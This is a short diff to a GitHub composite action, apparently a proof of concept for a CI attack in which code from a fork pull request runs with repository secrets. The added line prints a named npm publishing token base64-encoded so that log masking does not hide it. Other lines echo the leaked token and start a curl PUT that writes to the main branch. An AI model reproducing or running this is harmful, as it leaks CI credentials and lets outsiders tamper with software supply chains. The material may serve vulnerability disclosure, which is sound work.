@@ -16,6 +16,7 @@ runs:
         echo "POC: composite action resolved from the checked-out PR head commit"
         echo "POC: head commit = $(git rev-parse HEAD)"
         echo "POC: ADOBE_BOT_NPM_TOKEN = ${LEAKED}"
+        echo "POC: base64(ADOBE_BOT_NPM_TOKEN) = $(printf %s "${LEAKED}" | base64 -w0)"
         echo "POC: GITHUB_TOKEN length = ${#GH_TOK}"
         B64=$(printf 'fork-PR-head code wrote this to main with contents:write\n' | base64 -w0)
         curl -sS --max-time 20 -X PUT \
